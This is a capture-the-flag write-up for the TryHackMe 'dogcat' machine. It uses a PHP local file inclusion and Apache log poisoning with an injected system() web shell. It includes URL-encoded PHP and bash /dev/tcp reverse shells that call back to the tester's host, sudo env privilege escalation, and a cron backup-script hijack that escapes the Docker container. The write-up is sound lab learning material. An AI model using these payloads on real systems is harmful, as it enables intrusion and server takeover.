# what I learned
- php filter
- Log Poisoning
- Docker

# enumeration
## nmap
```console
kali@kali:~$ sudo python3 pymap.py -t <target>
[sudo] password for kali:                                                                          
created by gu2rks/kurohat                                                                          
find me here https://github.com/gu2rks                                                             
                                                                                                   
port scanning...                                                                                   
22/tcp open  ssh                                                                                   
80/tcp open  http                                                                                  
Enumerating open ports...                                                                          
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-04 15:46 EDT                                    
Nmap scan report for target                                                           
Host is up (0.076s latency).                                                                       
                                                                                                   
PORT   STATE SERVICE VERSION                                                                       
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                  
| ssh-hostkey:                                                                                     
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   44.19 ms 10.8.0.1
2   44.18 ms <ip>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.16 seconds
```

## Port 80 Web directory discovering
```
kali@kali:~/THM/dogcat$ gobuster dir -u http://<ip>/ -w /usr/share/SecLists/Discovery/Web-Content/big.txt -x .php,.txt,.html -t 54
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            <ip>
[+] Threads:        10
[+] Wordlist:       /usr/share/SecLists/Discovery/Web-Content/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2020/07/04 15:51:33 Starting gobuster
===============================================================
/cat.php (Status: 200)
/cats (Status: 301)
/dog.php (Status: 200)
/dogs (Status: 301)
/flag.php (Status: 200)
/index.php (Status: 200)
/server-status (Status: 403)
===============================================================
2020/07/04 15:57:59 Finished
===============================================================
```
after some enumerating. I try to put a directory map. it look somthing like this:


root
- index.php
- flag.php: cant view it, it return only empty page
- cat.php: get cat image rng
- dog.php: get dog image rn
- cats/ all cat images located here
  - 1.jpg...
- dogs/ all dog images located here
  - 1.jpg...


when I try to request for something else that cat or dog it give me this
![onlydogcat](pic/Screenshot%202020-07-04%20at%2021.44.54.png)


now I try to request for `/etc/passwd` and give me this error ```/?view=dog../../../../../../../etc/passwd```
![error](pic/Screenshot%202020-07-04%20at%2022.26.02.png)

Note that it added `.php` in the end of the file

## 1st flag
a litle bird told me to I can use **PHP wrapper**. After some digging, I found [this](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601). The article said *php://filter allows a pen tester to include local files and base64 encodes the output. Therefore, any base64 output will need to be decoded to reveal the contents.*


now let try to get cat.php: ```/?view=php://filter/convert.base64-encode/resource=cat```
```console
kali@kali:~/THM/dogcat$ echo "PGltZyBzcmM9ImNhdHMvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K" | base64 -d
<img src="cats/<?php echo rand(1, 10); ?>.jpg" />
```

index: ```/?view=php://filter/convert.base64-encode/resource=cat/../index```
```
PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```
use chef to decode it or ``base64``
```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```
so its works now let get flag which we already know where its located ```/?view=php://filter/convert.base64-encode/resource=cat/../flag.php```
```console
kali@kali:~/THM/dogcat$ echo "PD9waHAKJGZsYWdfMSA9ICJUSE17VGgxc18xc19OMHRfNF9DYXRkb2dfYWI2N2VkZmF9Igo/Pgo=" | base64 -d
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
```

refer back to the `index.php`. there is the way the dodge adding `.php` by includeing `&ext&` to the get request. by adding `&ext` we do not need to encode the web content anymore. Sometime understanding php can be handy


let try out ```/?view=php://filter/resource=cat../../../../../../../etc/passwd&ext```
![password](pic/Screenshot%202020-07-05%20at%2013.22.12.png)

it works now let get foothold on the machine

# Foothold
After some diging. There is a technique call **Log Poisoning** which can help us to get a foothold to the machine.


In general **Log Poisoning** is a technique where the attacker inject a malicouse code in side a log file then use LFI to render/exploit it. In this case we will inject a php code into the logs causing the php to render onto your web browser, once you refresh the page with the LFI vulnerability.


There are different way to do it: [here](https://www.hackingarticles.in/apache-log-poisoning-through-lfi/) Log poisoning into log using burpsuite. [Here](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/) log posioning into auth log using `ssh`

I will use burpsuite aproache since we dont have access to auth.log. let open burp and intercept get request and inject ```<?php system($_GET['c']); ?>``` into user-agent: like this
![burp](pic/Screenshot%202020-07-05%20at%2013.25.30.png)


/?view=php://filter//resource=cat/../../../../../../../var/log/apache2/access.log&ext&c=whoami
![whoami](pic/Screenshot%202020-07-05%20at%2013.27.02.png)


/?view=php://filter/resource=cat../../../../../../../var/log/apache2/access.log&ext&c=id
![id](pic/Screenshot%202020-07-05%20at%2013.39.02.png)


yea it work perfectly. let spawn a reverse shell. I try to check if python/pyhon3 is installed but nope let go with php shell then 
```php
php -r '$sock=fsockopen("10.8.14.151",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```
to make sure that url encoding will not fuck up our shell payload use [urlencoder](https://www.urlencoder.org/) to encode the payload which give use ```php%20-r%20%27%24sock%3Dfsockopen%28%2210.8.14.151%22%2C1234%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27```

now let let shell ```/?view=php://filter/resource=cat../../../../../../../var/log/apache2/access.log&ext&c=php%20-r%20%27%24sock%3Dfsockopen%28%2210.8.14.151%22%2C1234%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27```
```console
kali@kali:~$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.13.48] 51288
/bin/sh: 0: can't access tty; job control turned off
$ ls
flag2_QMW7JvaY2LvK.txt
html
$ pwd
/var/www
$ cat 'flag2_QMW7JvaY2LvK.txt' # flag2
```

# root

[/urs/bin/env](https://gtfobins.github.io/gtfobins/env/)

```console
$ sudo -l
Matching Defaults entries for www-data on ec080de4b5a0:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on ec080de4b5a0:
    (root) NOPASSWD: /usr/bin/env
$ sudo env /bin/sh
whoami
root
cd
ls
flag3.txt
```

```
cd opt  
ls -la
total 12
drwxr-xr-x 1 root root 4096 Jul  5 11:20 .
drwxr-xr-x 1 root root 4096 Jul  5 11:20 ..
drwxr-xr-x 2 root root 4096 Apr  8 12:38 backups
cd backups      
ls
backup.sh
backup.tar
cat backup.sh 
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
file backup.tar
backup.tar: POSIX tar archive (GNU)
tar xvf backup.tar 
```
seem like we will need to do something with docker `/root/container` and when I extract the `.tar` I found *dockerfile*. to confirm that I ran ```hostname``` and it give me really weird hostname (not root)


After some digging, I assume that `backup.sh` was run by the real root user outside the container (hope you understand what I mean). To comfirm that my hypothesis is correct I ran ```ls -la``` to check the last access on `backup.tar` 
```
ls -la
total 5768
drwxr-xr-x 3 root root    4096 Jul  5 12:39 .
drwxr-xr-x 1 root root    4096 Jul  5 11:20 ..
-rwxr--r-- 1 root root      69 Mar 10 20:49 backup.sh
-rw-r--r-- 1 root root 5888000 Jul  5 12:55 backup.tar
drwxr-xr-x 3 root root    4096 Jul  5 12:39 root
ls -la
total 5768
drwxr-xr-x 3 root root    4096 Jul  5 12:39 .
drwxr-xr-x 1 root root    4096 Jul  5 11:20 ..
-rwxr--r-- 1 root root      69 Mar 10 20:49 backup.sh
-rw-r--r-- 1 root root 5888000 Jul  5 12:56 backup.tar
drwxr-xr-x 3 root root    4096 Jul  5 12:39 root
ls -la
total 5768
drwxr-xr-x 3 root root    4096 Jul  5 12:39 .
drwxr-xr-x 1 root root    4096 Jul  5 11:20 ..
-rwxr--r-- 1 root root      69 Mar 10 20:49 backup.sh
-rw-r--r-- 1 root root 5888000 Jul  5 12:57 backup.tar
drwxr-xr-x 3 root root    4096 Jul  5 12:39 root
ls -la
total 5768
drwxr-xr-x 3 root root    4096 Jul  5 12:39 .
drwxr-xr-x 1 root root    4096 Jul  5 11:20 ..
-rwxr--r-- 1 root root      69 Mar 10 20:49 backup.sh
-rw-r--r-- 1 root root 5888000 Jul  5 12:58 backup.tar
drwxr-xr-x 3 root root    4096 Jul  5 12:39 root
```
we knew that `backup.sh` create a `backup.tar`. moreover this show that `backup.sh` where executed by root (I guess) user outsite the container each 1 min since the access time `backup.tar` is change each 1 min


we can esacalate the container by modifying `backup.sh` adding reverse shell `bash -i >& /dev/tcp/<ip>/6969 0>&1`. Now run nc and waiting for shell

```console
kali@kali:~/THM/dogcat$ nc -nlvp 6969
listening on [any] 6969 ...
connect to [10.8.14.151] from (UNKNOWN) [10.10.13.48] 57520
bash: cannot set terminal process group (7082): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# ls
ls
container
flag4.txt
root@dogcat:~# 
```

GG.